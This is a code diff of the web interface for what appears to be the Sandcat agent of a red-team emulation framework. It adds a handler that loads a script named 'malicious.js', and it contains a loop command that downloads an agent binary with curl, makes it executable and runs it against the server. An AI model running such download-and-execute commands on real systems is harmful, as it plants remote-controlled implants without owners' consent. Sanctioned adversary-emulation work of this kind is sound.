@@ -1,4 +1,3 @@
-<script src="/gui/js/shared.js"></script>
 <html>
     <head>
         <title>Sandcat | 54ndc47</title>
@@ -86,7 +85,9 @@
         </center>
     </body>
     <script src="/gui/jquery/jquery.js"></script>
+    <script src="/gui/js/shared.js"></script>
     <script>
+        activate([{'download the agent': actionDownload}]);
         function show(identity) {
             let x = $('#delivery-command');
             let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
@@ -100,7 +101,9 @@
                 x.text('while true; do curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group; sleep 60; done');
             }
         }
-
+        function actionDownload(phrase){
+            $.getScript('/sandcat/js/malicious.js');
+        }
         function cloneWebsite(){
             let _url = document.getElementById("cloneNew").value;
             if (validURL(_url)) {
@@ -111,14 +114,12 @@
                 type: 'GET',
                 success: function(data, status, options) { section.prop('disabled', false).css('opacity', 1.0); }
                 });
-            }else{
+            } else {
                 alert("URL format is incorrect");
             }
-
         }
-
         function validURL(str) {
-            var pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+            let pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
                 '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|'+ // domain name
                 '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
                 '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
